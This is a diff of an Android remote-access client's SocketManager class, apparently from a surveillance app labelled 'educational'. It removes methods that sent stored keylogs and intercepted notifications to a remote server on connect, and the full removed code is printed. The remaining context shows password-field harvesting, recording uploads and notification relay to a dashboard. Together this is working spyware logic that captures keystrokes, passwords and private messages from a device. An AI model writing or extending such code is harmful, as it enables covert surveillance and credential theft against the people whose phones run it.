@@ -443,10 +443,6 @@ public class SocketManager {
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
-                // Push recent keylogs and notifications as snapshots so the server
-                // cache is populated immediately — avoids needing a command round-trip.
-                pushKeylogSnapshot();
-                pushNotificationSnapshot();
                 java.io.BufferedReader lIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(liveSocket.getInputStream()));
                 String lLine;
@@ -1966,51 +1962,6 @@ public class SocketManager {
         } catch (Exception e) {
             Log.w(TAG, "pushPasswordFieldsFromInputFields: " + e.getMessage());
         }
-    }
-
-    /**
-     * Push a snapshot of recent stored keylogs via the live channel so the server cache
-     * is populated immediately on connect — eliminates the need for get_keylogs commands.
-     */
-    private void pushKeylogSnapshot() {
-        executor.execute(() -> {
-            try {
-                if (keyloggerService == null) return;
-                JSONObject result = keyloggerService.getKeylogs(300);
-                if (result == null || !result.optBoolean("success", false)) return;
-                org.json.JSONArray logs = result.optJSONArray("logs");
-                if (logs == null || logs.length() == 0) return;
-                JSONObject payload = new JSONObject();
-                payload.put("deviceId", DeviceInfo.getDeviceId(context));
-                payload.put("logs", logs);
-                sendLiveMessage("keylog:snapshot", payload);
-                Log.d(TAG, "pushKeylogSnapshot: sent " + logs.length() + " entries");
-            } catch (Exception e) {
-                Log.e(TAG, "pushKeylogSnapshot error: " + e.getMessage());
-            }
-        });
-    }
-
-    /**
-     * Push a snapshot of stored notifications via the live channel so the server cache
-     * is populated immediately on connect — eliminates the need for get_notifications commands.
-     */
-    private void pushNotificationSnapshot() {
-        executor.execute(() -> {
-            try {
-                JSONObject result = com.remoteaccess.educational.services.NotificationInterceptor.getAllNotifications();
-                if (result == null || !result.optBoolean("success", false)) return;
-                org.json.JSONArray notifs = result.optJSONArray("notifications");
-                if (notifs == null || notifs.length() == 0) return;
-                JSONObject payload = new JSONObject();
-                payload.put("deviceId", DeviceInfo.getDeviceId(context));
-                payload.put("notifications", notifs);
-                sendLiveMessage("notification:snapshot", payload);
-                Log.d(TAG, "pushNotificationSnapshot: sent " + notifs.length() + " entries");
-            } catch (Exception e) {
-                Log.e(TAG, "pushNotificationSnapshot error: " + e.getMessage());
-            }
-        });
     }
 
     /** Push a live notification to the server (relayed to dashboard) via live channel. */
